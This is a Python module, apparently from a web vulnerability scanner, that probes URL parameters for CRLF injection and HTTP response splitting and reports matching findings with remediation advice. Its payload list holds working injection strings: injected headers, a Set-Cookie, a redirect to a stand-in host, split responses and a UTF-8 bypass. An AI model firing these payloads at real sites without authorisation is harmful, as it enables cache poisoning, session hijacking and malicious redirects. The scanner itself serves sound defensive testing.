"""CRLF injection — HTTP response splitting via \r\n in URL params and path."""
from typing import List
from scanner.core.crawler import CrawlResult
from scanner.core.scan_result import Finding, Severity
from scanner.utils.http import get_url_params, inject_url_param, fetch

_PAYLOADS = [
    "%0d%0aX-KageSec-Injected: crlf",
    "%0aX-KageSec-Injected: crlf",
    "\r\nX-KageSec-Injected: crlf",
    "\nX-KageSec-Injected: crlf",
    "%0d%0aSet-Cookie: kagesec=injected",
    "%0d%0aLocation: https://evil.kagesec.io",
    "%0d%0a%0d%0a<html>CRLF</html>",
    "a%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK",
    "%E5%98%8D%E5%98%8AX-KageSec-Injected: crlf",   # UTF-8 CRLF bypass
]

_INJECTED_HEADER = "x-kagesec-injected"
_INJECTED_COOKIE = "kagesec"


def test(page: CrawlResult, client) -> List[Finding]:
    findings = []
    params = get_url_params(page.url)
    for param in params:
        for payload in _PAYLOADS:
            url = inject_url_param(page.url, param, payload)
            resp = fetch(client, "get", url)
            if not resp:
                continue
            headers = dict(resp.headers) if hasattr(resp, "headers") else {}
            header_keys = {k.lower() for k in headers}
            cookies = headers.get("set-cookie", "")
            body = getattr(resp, "text", "")

            injected = (
                _INJECTED_HEADER in header_keys
                or _INJECTED_COOKIE in cookies.lower()
                or "CRLF" in body
                or "Location: https://evil.kagesec.io" in body
            )
            if injected:
                findings.append(_finding(page.url, param, payload))
                break
    return findings


def _finding(url: str, param: str, payload: str) -> Finding:
    return Finding(
        title="CRLF Injection / HTTP Response Splitting",
        severity=Severity.MEDIUM,
        url=url,
        parameter=param,
        payload=payload,
        evidence=f"Injected CRLF sequence via param '{param}' reflected as HTTP header in response",
        description=(
            "CRLF injection allows an attacker to insert arbitrary HTTP headers or split the "
            "response into two separate HTTP responses. This can be used to poison web caches, "
            "perform cross-site scripting, hijack sessions, or redirect users."
        ),
        remediation=(
            "Strip or encode \\r and \\n characters from all user-supplied input before using it "
            "in HTTP response headers. Use a framework-level output encoding function."
        ),
        cwe="CWE-93",
        cvss=6.1,
        owasp_category="A03:2021 Injection",
        confidence=0.9,
    )
